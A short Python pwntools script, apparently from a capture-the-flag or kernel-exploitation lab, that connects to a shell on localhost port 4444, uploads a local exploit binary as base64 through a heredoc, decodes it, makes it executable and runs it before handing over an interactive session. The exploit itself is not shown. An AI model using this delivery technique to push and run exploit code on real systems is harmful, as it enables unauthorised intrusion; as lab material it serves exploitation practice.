#!/usr/bin/env python3
from base64 import b64encode
from pwn import *

p = remote('localhost', 4444)

p.sendlineafter('/ # ', 'stty -echo')
p.sendlineafter('/ # ', 'cat << EOF > exp.b64')
p.sendline(b64encode(read('exp')).decode())
p.sendline("EOF")

p.sendlineafter('/ # ', 'base64 -d exp.b64 > exp')
p.sendlineafter('/ # ', 'chmod +x exp')
p.sendlineafter('/ # ', 'stty +echo')

p.sendlineafter('/ # ', './exp')

p.interactive()